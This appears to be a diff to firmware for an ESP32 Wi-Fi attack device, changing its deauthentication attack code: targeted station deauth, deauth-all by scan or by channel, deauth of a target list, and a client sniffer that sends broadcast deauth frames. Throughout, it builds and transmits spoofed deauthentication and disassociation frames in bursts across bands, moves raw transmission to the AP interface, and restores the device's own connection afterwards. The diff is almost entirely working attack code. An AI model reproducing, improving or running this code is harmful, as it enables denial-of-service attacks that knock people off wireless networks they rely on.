@@ -260,6 +260,46 @@ void buildOptimizedDeauthFrame(
     frame[25] = 0x00;
 }
 
+bool initializeDeauthMode(int channel, bool enhanced_mode, WiFiState& savedState) {
+    if (enhanced_mode) {
+        return tryMonitorMode(channel);
+    }
+    
+    // Save current WiFi state before disconnecting
+    savedState = saveWiFiState();
+    
+    // Disconnect from any existing network
+    wifiDisconnect();
+    delay(10);
+    
+    // Switch to AP mode
+    WiFi.mode(WIFI_AP);
+    
+    // Try to start AP
+    String currentSsid = WiFi.SSID();
+    if (currentSsid.length() == 0) {
+        currentSsid = "DEAUTH_" + String(random(1000, 9999));
+    }
+    
+    // Try multiple times to start AP
+    int attempts = 0;
+    bool apStarted = false;
+    while (attempts < 3 && !apStarted) {
+        apStarted = WiFi.softAP(currentSsid.c_str(), emptyString, channel, 1, 4, false);
+        if (!apStarted) {
+            delay(100);
+            attempts++;
+        }
+    }
+    
+    if (!apStarted) {
+        displayError("Failed to start Deauth AP", true);
+        return false;
+    }
+    
+    return true;
+}
+
 void sendDeauthToAP(APInfo& ap, const uint8_t* targetMAC, bool enhanced_mode, int& total_frames) {
     uint8_t deauth_ap_to_sta[26];
     uint8_t disassoc_ap_to_sta[26];
@@ -276,10 +316,10 @@ void sendDeauthToAP(APInfo& ap, const uint8_t* targetMAC, bool enhanced_mode, in
         esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
     }
     if (enhanced_mode) {
-        wifiRawTx(WIFI_IF_STA, deauth_ap_to_sta, 26);
-        wifiRawTx(WIFI_IF_STA, disassoc_ap_to_sta, 26);
-        wifiRawTx(WIFI_IF_STA, deauth_sta_to_ap, 26);
-        wifiRawTx(WIFI_IF_STA, disassoc_sta_to_ap, 26);
+        wifiRawTx(WIFI_IF_AP, deauth_ap_to_sta, 26);
+        wifiRawTx(WIFI_IF_AP, disassoc_ap_to_sta, 26);
+        wifiRawTx(WIFI_IF_AP, deauth_sta_to_ap, 26);
+        wifiRawTx(WIFI_IF_AP, disassoc_sta_to_ap, 26);
     } else {
         send_raw_frame(deauth_ap_to_sta, 26);
         vTaskDelay(pdMS_TO_TICKS(1));
@@ -346,6 +386,8 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
         displayError("Could not find target AP", true);
         return;
     }
+    
+    bool wasConnected = savedState.was_connected;
     int band = getWiFiBand(channel);
     bool is_5ghz = (band == 1 || band == 2);
     cacheSameSSIDAPs();
@@ -361,18 +403,15 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
     bool has_multiple_bands = (ap_24ghz.size() > 0 && ap_5ghz.size() > 0) ||
                               (ap_24ghz.size() > 0 && ap_6ghz.size() > 0) ||
                               (ap_5ghz.size() > 0 && ap_6ghz.size() > 0);
+    
     bool enhanced_mode = tryMonitorMode(channel);
     if (!enhanced_mode) {
-        wifiDisconnect();
-        delay(10);
-        WiFi.mode(WIFI_AP);
-        String currentSsid = WiFi.SSID();
-        if (currentSsid.length() == 0) { currentSsid = "DEAUTH_" + String(random(1000, 9999)); }
-        if (!WiFi.softAP(currentSsid.c_str(), emptyString, channel, 1, 4, false)) {
-            displayError("Fail starting Deauth", true);
+        if (!initializeDeauthMode(channel, false, savedState)) {
+            restoreWiFiState(savedState);
             return;
         }
     }
+    
     uint8_t deauth_ap_to_sta[26];
     uint8_t disassoc_ap_to_sta[26];
     uint8_t deauth_sta_to_ap[26];
@@ -399,13 +438,13 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
     }
     padprintln("");
     padprintln("Press BACK to STOP.");
-    
+
     SelPress = false;
     EscPress = false;
     PrevPress = false;
     NextPress = false;
     delay(100);
-    
+
     long tmp = millis();
     int cont = 0;
     int total_frames = 0;
@@ -437,10 +476,10 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
                 burst_counter++;
             } else {
                 if (enhanced_mode) {
-                    wifiRawTx(WIFI_IF_STA, deauth_ap_to_sta, 26);
-                    wifiRawTx(WIFI_IF_STA, disassoc_ap_to_sta, 26);
-                    wifiRawTx(WIFI_IF_STA, deauth_sta_to_ap, 26);
-                    wifiRawTx(WIFI_IF_STA, disassoc_sta_to_ap, 26);
+                    wifiRawTx(WIFI_IF_AP, deauth_ap_to_sta, 26);
+                    wifiRawTx(WIFI_IF_AP, disassoc_ap_to_sta, 26);
+                    wifiRawTx(WIFI_IF_AP, deauth_sta_to_ap, 26);
+                    wifiRawTx(WIFI_IF_AP, disassoc_sta_to_ap, 26);
                 } else {
                     send_raw_frame(deauth_ap_to_sta, 26);
                     vTaskDelay(pdMS_TO_TICKS(1));
@@ -466,10 +505,10 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
             buildOptimizedDeauthFrame(deauth_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, current_reason, false);
             buildOptimizedDeauthFrame(disassoc_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, current_reason, true);
             if (enhanced_mode) {
-                wifiRawTx(WIFI_IF_STA, deauth_ap_to_sta, 26);
-                wifiRawTx(WIFI_IF_STA, disassoc_ap_to_sta, 26);
-                wifiRawTx(WIFI_IF_STA, deauth_sta_to_ap, 26);
-                wifiRawTx(WIFI_IF_STA, disassoc_sta_to_ap, 26);
+                wifiRawTx(WIFI_IF_AP, deauth_ap_to_sta, 26);
+                wifiRawTx(WIFI_IF_AP, disassoc_ap_to_sta, 26);
+                wifiRawTx(WIFI_IF_AP, deauth_sta_to_ap, 26);
+                wifiRawTx(WIFI_IF_AP, disassoc_sta_to_ap, 26);
             } else {
                 send_raw_frame(deauth_ap_to_sta, 26);
                 vTaskDelay(pdMS_TO_TICKS(1));
@@ -485,10 +524,10 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
             burst_counter++;
         } else {
             if (enhanced_mode) {
-                wifiRawTx(WIFI_IF_STA, deauth_ap_to_sta, 26);
-                wifiRawTx(WIFI_IF_STA, disassoc_ap_to_sta, 26);
-                wifiRawTx(WIFI_IF_STA, deauth_sta_to_ap, 26);
-                wifiRawTx(WIFI_IF_STA, disassoc_sta_to_ap, 26);
+                wifiRawTx(WIFI_IF_AP, deauth_ap_to_sta, 26);
+                wifiRawTx(WIFI_IF_AP, disassoc_ap_to_sta, 26);
+                wifiRawTx(WIFI_IF_AP, deauth_sta_to_ap, 26);
+                wifiRawTx(WIFI_IF_AP, disassoc_sta_to_ap, 26);
             } else {
                 send_raw_frame(deauth_ap_to_sta, 26);
                 vTaskDelay(pdMS_TO_TICKS(1));
@@ -515,7 +554,7 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
                 buildOptimizedDeauthFrame(broadcast_frame, broadcast_mac, apBSSID, apBSSID, broadcast_reason, false);
             }
             if (enhanced_mode) {
-                wifiRawTx(WIFI_IF_STA, broadcast_frame, 26);
+                wifiRawTx(WIFI_IF_AP, broadcast_frame, 26);
             } else {
                 send_raw_frame(broadcast_frame, 26);
             }
@@ -539,10 +578,10 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
                         buildOptimizedDeauthFrame(disassoc_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, true);
                     }
                     if (enhanced_mode) {
-                        wifiRawTx(WIFI_IF_STA, deauth_ap_to_sta, 26);
-                        wifiRawTx(WIFI_IF_STA, disassoc_ap_to_sta, 26);
-                        wifiRawTx(WIFI_IF_STA, deauth_sta_to_ap, 26);
-                        wifiRawTx(WIFI_IF_STA, disassoc_sta_to_ap, 26);
+                        wifiRawTx(WIFI_IF_AP, deauth_ap_to_sta, 26);
+                        wifiRawTx(WIFI_IF_AP, disassoc_ap_to_sta, 26);
+                        wifiRawTx(WIFI_IF_AP, deauth_sta_to_ap, 26);
+                        wifiRawTx(WIFI_IF_AP, disassoc_sta_to_ap, 26);
                     } else {
                         send_raw_frame(deauth_ap_to_sta, 26);
                         vTaskDelay(pdMS_TO_TICKS(1));
@@ -573,10 +612,10 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
                         buildOptimizedDeauthFrame(disassoc_sta_to_ap, current_ap.bssid, targetMAC, current_ap.bssid, burst_reason, true);
                     }
                     if (enhanced_mode) {
-                        wifiRawTx(WIFI_IF_STA, deauth_ap_to_sta, 26);
-                        wifiRawTx(WIFI_IF_STA, disassoc_ap_to_sta, 26);
-                        wifiRawTx(WIFI_IF_STA, deauth_sta_to_ap, 26);
-                        wifiRawTx(WIFI_IF_STA, disassoc_sta_to_ap, 26);
+                        wifiRawTx(WIFI_IF_AP, deauth_ap_to_sta, 26);
+                        wifiRawTx(WIFI_IF_AP, disassoc_ap_to_sta, 26);
+                        wifiRawTx(WIFI_IF_AP, deauth_sta_to_ap, 26);
+                        wifiRawTx(WIFI_IF_AP, disassoc_sta_to_ap, 26);
                     } else {
                         send_raw_frame(deauth_ap_to_sta, 26);
                         vTaskDelay(pdMS_TO_TICKS(1));
@@ -633,21 +672,25 @@ void stationDeauth(Host host, const uint8_t *apBssidIn) {
     if (has_multiple_bands) {
         padprintln("Multi-band attack used");
     }
+    
+    // Restore WiFi connection if we were connected
+    if (wasConnected) {
+        padprintln("Restoring WiFi connection...");
+        restoreWiFiState(savedState);
+    }
     delay(1000);
 }
 
 void runDeauthAll(uint8_t* targetMAC, int channel) {
     WiFiState savedState = saveWiFiState();
+    bool wasConnected = savedState.was_connected;
     int band = getWiFiBand(channel);
     cacheSameSSIDAPs();
     bool useMultipleAPs = sameSSID_APs.size() > 1;
     bool enhanced_mode = tryMonitorMode(channel);
     if (!enhanced_mode) {
-        wifiDisconnect();
-        delay(10);
-        WiFi.mode(WIFI_AP);
-        if (!WiFi.softAP("DEAUTH_ALL", emptyString, channel, 1, 4, false)) {
-            displayError("Failed to start Deauth", true);
+        if (!initializeDeauthMode(channel, false, savedState)) {
+            restoreWiFiState(savedState);
             return;
         }
     }
@@ -662,13 +705,13 @@ void runDeauthAll(uint8_t* targetMAC, int channel) {
     }
     padprintln("");
     padprintln("Press BACK to STOP.");
-    
+
     SelPress = false;
     EscPress = false;
     PrevPress = false;
     NextPress = false;
     delay(100);
-    
+
     uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     uint8_t frame[26];
     uint32_t start_time = millis();
@@ -697,7 +740,7 @@ void runDeauthAll(uint8_t* targetMAC, int channel) {
             buildOptimizedDeauthFrame(frame, broadcast_mac, targetMAC, targetMAC, reason, false);
         }
         if (enhanced_mode) {
-            wifiRawTx(WIFI_IF_STA, frame, 26);
+            wifiRawTx(WIFI_IF_AP, frame, 26);
         } else {
             send_raw_frame(frame, 26);
         }
@@ -718,7 +761,7 @@ void runDeauthAll(uint8_t* targetMAC, int channel) {
                     buildOptimizedDeauthFrame(frame, broadcast_mac, targetMAC, targetMAC, extra_reason, false);
                 }
                 if (enhanced_mode) {
-                    wifiRawTx(WIFI_IF_STA, frame, 26);
+                    wifiRawTx(WIFI_IF_AP, frame, 26);
                 } else {
                     send_raw_frame(frame, 26);
                 }
@@ -750,47 +793,53 @@ void runDeauthAll(uint8_t* targetMAC, int channel) {
     tft.fillRect(0, tftHeight - 60, tftWidth, 60, TFT_BLACK);
     padprintln("Attack stopped.");
     padprintln("Frames sent: " + String(total_frames));
+    
+    // Restore WiFi connection if we were connected
+    if (wasConnected) {
+        padprintln("Restoring WiFi connection...");
+        restoreWiFiState(savedState);
+    }
     delay(1500);
 }
 
 void deauthAllFromScan() {
     WiFiState savedState = saveWiFiState();
     drawMainBorderWithTitle("Select AP");
-    
+
     displayTextLine("Scanning for networks...");
     int n = WiFi.scanNetworks(false, false);
     if (n == 0) {
         displayError("No networks found", true);
         return;
     }
-    
+
     options.clear();
     for (int i = 0; i < n; i++) {
         String ssid = WiFi.SSID(i);
         String bssid = WiFi.BSSIDstr(i);
         int channel = WiFi.channel(i);
         int rssi = WiFi.RSSI(i);
-        
+
         String displayName = ssid.length() > 0 ? ssid : "<Hidden>";
         String optionText = displayName + " (" + String(rssi) + "dBm|ch" + String(channel) + ")";
-        
+
         options.push_back({optionText.c_str(), [=]() {
             uint8_t targetMAC[6];
             memcpy(targetMAC, WiFi.BSSID((uint8_t)i), 6);
             int ch = WiFi.channel((uint8_t)i);
             WiFi.scanDelete();
-            
+
             SelPress = false;
             EscPress = false;
             PrevPress = false;
             NextPress = false;
             delay(100);
-            
+
             runDeauthAll(targetMAC, ch);
         }});
     }
     options.push_back({"Back", []() { returnToMenu = true; }});
-    
+
     addOptionToMainMenu();
     loopOptions(options);
 }
@@ -798,32 +847,32 @@ void deauthAllFromScan() {
 void deauthAllByChannel() {
     WiFiState savedState = saveWiFiState();
     drawMainBorderWithTitle("Select Channel");
-    
+
     options.clear();
     for (int ch = 1; ch <= 14; ch++) {
         String band = (ch >= 1 && ch <= 11) ? "2.4GHz" : (ch >= 36 ? "5GHz" : "2.4GHz");
         String optionText = "Channel " + String(ch) + " (" + band + ")";
         options.push_back({optionText.c_str(), [=]() {
             uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
-            
+
             SelPress = false;
             EscPress = false;
             PrevPress = false;
             NextPress = false;
             delay(100);
-            
+
             runDeauthAll(broadcast_mac, ch);
         }});
     }
     options.push_back({"Back", []() { returnToMenu = true; }});
-    
+
     addOptionToMainMenu();
     loopOptions(options);
 }
 
 void deauthAllMenu() {
     drawMainBorderWithTitle("Deauth All");
-    
+
     options = {
         {"Select from Scan", [=]() { deauthAllFromScan(); }},
         {"Select Channel", [=]() { deauthAllByChannel(); }},
@@ -839,16 +888,14 @@ void runDeauthTargetList(const std::vector<Host>& targets, uint8_t* targetMAC, i
         return;
     }
     WiFiState savedState = saveWiFiState();
+    bool wasConnected = savedState.was_connected;
     int band = getWiFiBand(channel);
     cacheSameSSIDAPs();
     bool useMultipleAPs = sameSSID_APs.size() > 1;
     bool enhanced_mode = tryMonitorMode(channel);
     if (!enhanced_mode) {
-        wifiDisconnect();
-        delay(10);
-        WiFi.mode(WIFI_AP);
-        if (!WiFi.softAP("DEAUTH_LIST", emptyString, channel, 1, 4, false)) {
-            displayError("Failed to start Deauth", true);
+        if (!initializeDeauthMode(channel, false, savedState)) {
+            restoreWiFiState(savedState);
             return;
         }
     }
@@ -863,13 +910,13 @@ void runDeauthTargetList(const std::vector<Host>& targets, uint8_t* targetMAC, i
     }
     padprintln("");
     padprintln("Press BACK to STOP.");
-    
+
     SelPress = false;
     EscPress = false;
     PrevPress = false;
     NextPress = false;
     delay(100);
-    
+
     uint32_t start_time = millis();
     int total_frames = 0;
     size_t target_index = 0;
@@ -906,7 +953,7 @@ void runDeauthTargetList(const std::vector<Host>& targets, uint8_t* targetMAC, i
             }
             for (int i = 0; i < 4; i++) {
                 if (enhanced_mode) {
-                    wifiRawTx(WIFI_IF_STA, frames[i], 26);
+                    wifiRawTx(WIFI_IF_AP, frames[i], 26);
                 } else {
                     send_raw_frame(frames[i], 26);
                 }
@@ -938,47 +985,53 @@ void runDeauthTargetList(const std::vector<Host>& targets, uint8_t* targetMAC, i
     tft.fillRect(0, tftHeight - 60, tftWidth, 60, TFT_BLACK);
     padprintln("Attack stopped.");
     padprintln("Frames sent: " + String(total_frames));
+    
+    // Restore WiFi connection if we were connected
+    if (wasConnected) {
+        padprintln("Restoring WiFi connection...");
+        restoreWiFiState(savedState);
+    }
     delay(1000);
 }
 
 void showAPSelectionForClientDeauth() {
     WiFiState savedState = saveWiFiState();
     drawMainBorderWithTitle("Select AP");
-    
+
     displayTextLine("Scanning for networks...");
     int n = WiFi.scanNetworks(false, false);
     if (n == 0) {
         displayError("No networks found", true);
         return;
     }
-    
+
     options.clear();
     for (int i = 0; i < n; i++) {
         String ssid = WiFi.SSID(i);
         String bssid = WiFi.BSSIDstr(i);
         int channel = WiFi.channel(i);
         int rssi = WiFi.RSSI(i);
-        
+
         String displayName = ssid.length() > 0 ? ssid : "<Hidden>";
         String optionText = displayName + " (" + String(rssi) + "dBm|ch" + String(channel) + ")";
-        
+
         options.push_back({optionText.c_str(), [=]() {
             uint8_t targetMAC[6];
             memcpy(targetMAC, WiFi.BSSID((uint8_t)i), 6);
             int ch = WiFi.channel((uint8_t)i);
             WiFi.scanDelete();
-            
+
             SelPress = false;
             EscPress = false;
             PrevPress = false;
             NextPress = false;
             delay(100);
-            
+
             scanClientsOnAP(targetMAC, ch);
         }});
     }
     options.push_back({"Back", []() { returnToMenu = true; }});
-    
+
     addOptionToMainMenu();
     loopOptions(options);
 }
@@ -986,17 +1039,17 @@ void showAPSelectionForClientDeauth() {
 // Client detection sniffer callback
 void clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
     if (!clientScanActive) return;
-    
+
     wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
     wifi_header_t* header = (wifi_header_t*)pkt->payload;
-    
+
     if (type == WIFI_PKT_DATA) {
         uint8_t clientMAC[6];
         memcpy(clientMAC, header->addr2, 6);
-        
+
         if (memcmp(header->addr1, scanTargetBSSID, 6) == 0 ||
             memcmp(header->addr3, scanTargetBSSID, 6) == 0) {
-            
+
             bool exists = false;
             for (auto& c : detectedClients) {
                 uint8_t existingMAC[6];
@@ -1020,51 +1073,55 @@ void clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
 
 void scanClientsOnAP(uint8_t* targetMAC, int channel) {
     WiFiState savedState = saveWiFiState();
-    
+    bool wasConnected = savedState.was_connected;
+
     drawMainBorderWithTitle("Scanning Clients");
     tft.setTextSize(FP);
     padprintln("Scanning for clients on CH " + String(channel));
     padprintln("");
     padprintln("Press BACK to stop");
-    
+
     detectedClients.clear();
     memcpy(scanTargetBSSID, targetMAC, 6);
     clientScanActive = true;
-    
+
     bool enhanced_mode = tryMonitorMode(channel);
     if (!enhanced_mode) {
         displayError("Failed to enter monitor mode", true);
         clientScanActive = false;
+        if (wasConnected) {
+            restoreWiFiState(savedState);
+        }
         return;
     }
-    
+
     esp_wifi_set_promiscuous_rx_cb(clientSnifferCallback);
-    
+
     uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
     uint8_t frame[26];
     buildOptimizedDeauthFrame(frame, broadcast_mac, targetMAC, targetMAC, 0x07, false);
-    
+
     uint32_t startTime = millis();
     int scanCount = 0;
-    
+
     SelPress = false;
     EscPress = false;
     PrevPress = false;
     NextPress = false;
     delay(100);
-    
+
     while (!check(EscPress) && millis() - startTime < 8000) {
         if (millis() - startTime > scanCount * 1000) {
-            wifiRawTx(WIFI_IF_STA, frame, 26);
+            wifiRawTx(WIFI_IF_AP, frame, 26);
             scanCount++;
-            
+
             tft.fillRect(0, 80, tftWidth, tftHeight - 100, TFT_BLACK);
             tft.setCursor(10, 80);
             padprintln("Scanning... (" + String(scanCount) + "s)");
             padprintln("");
             padprintln("Clients found: " + String(detectedClients.size()));
             padprintln("");
-            
+
             String spinner = "|/-\\";
             int idx = (scanCount % 4);
             padprintln("  " + String(spinner[idx]) + " Scanning...");
@@ -1073,13 +1130,18 @@ void scanClientsOnAP(uint8_t* targetMAC, int channel) {
         }
         vTaskDelay(100 / portTICK_PERIOD_MS);
     }
-    
+
     clientScanActive = false;
     if (enhanced_mode) {
         esp_wifi_set_promiscuous(false);
     }
     esp_wifi_set_promiscuous_rx_cb(NULL);
-    
+
+    // Restore WiFi connection if we were connected
+    if (wasConnected) {
+        restoreWiFiState(savedState);
+    }
+
     showClientSelectionForDeauth(detectedClients, targetMAC, channel);
 }
 
@@ -1099,17 +1161,17 @@ void showClientSelectionForDeauth(const std::vector<Host>& clients, uint8_t* tar
             }});
         }
     }
-    
+
     options.push_back({"Deauth ALL Clients", [=]() {
         runDeauthAll(targetMAC, channel);
     }});
-    
+
     options.push_back({"Rescan", [=]() {
         scanClientsOnAP(targetMAC, channel);
     }});
-    
+
     options.push_back({"Back", []() { returnToMenu = true; }});
-    
+
     addOptionToMainMenu();
     loopOptions(options);
 }
@@ -1120,41 +1182,41 @@ void deauthTargetListMenu() {
 
 void showTargetSelection() {
     drawMainBorderWithTitle("Select Target");
-    
+
     displayTextLine("Scanning for networks...");
-    
+
     int n = WiFi.scanNetworks(false, true);
     if (n == 0) {
         displayError("No networks found", true);
         return;
     }
-    
+
     options.clear();
     for (int i = 0; i < n; i++) {
         String ssid = WiFi.SSID(i);
         String bssid = WiFi.BSSIDstr(i);
         int channel = WiFi.channel(i);
         int rssi = WiFi.RSSI(i);
-        
+
         String displayName = ssid.length() > 0 ? ssid : "<Hidden>";
         String optionText = displayName + " (" + String(rssi) + "dBm|ch" + String(channel) + ")";
-        
+
         options.push_back({optionText.c_str(), [=]() {
             uint8_t mac[6];
             sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                    &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
             eth_addr eth;
             memcpy(eth.addr, mac, 6);
-            
+
             ip4_addr_t ip;
             ip.addr = 0;
-            
+
             Host target(&ip, &eth);
             stationDeauth(target);
         }});
     }
     options.push_back({"Back", []() { returnToMenu = true; }});
-    
+
     addOptionToMainMenu();
     loopOptions(options);
 }
@@ -1162,19 +1224,19 @@ void showTargetSelection() {
 std::vector<Host> buildTargetListFromScan() {
     std::vector<Host> targets;
     int n = WiFi.scanNetworks(false, true);
-    
+
     for (int i = 0; i < n; i++) {
         String bssid = WiFi.BSSIDstr(i);
-        
+
         uint8_t mac[6];
         sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
         eth_addr eth;
         memcpy(eth.addr, mac, 6);
-        
+
         ip4_addr_t ip;
         ip.addr = 0;
-        
+
         Host host(&ip, &eth);
         targets.push_back(host);
     }
